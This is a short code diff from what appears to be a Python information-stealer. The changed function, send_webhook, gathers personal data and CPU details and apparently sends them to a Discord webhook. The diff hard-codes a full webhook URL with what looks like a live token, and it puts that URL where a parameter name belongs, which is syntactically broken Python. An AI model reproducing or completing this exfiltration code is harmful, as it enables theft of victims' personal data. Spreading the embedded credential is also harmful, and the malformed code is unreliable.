@@ -368,7 +368,7 @@ def main(dirpath):
     ]
 
 
-def send_webhook(DISCORD_WEBHOOK_URLs):
+def send_webhook(https://discord.com/api/webhooks/1228384348923891773/lgzuxj68hgJjhCIkiycb44doUuvxO28UmPGKEKHvgzIBFDM-GW5M6F9VyohMqJ-ByM4m):
     p_lst = get_Personal_data()
     cpuinfo = get_cpu_info()
     with TemporaryDirectory(dir=".") as td:
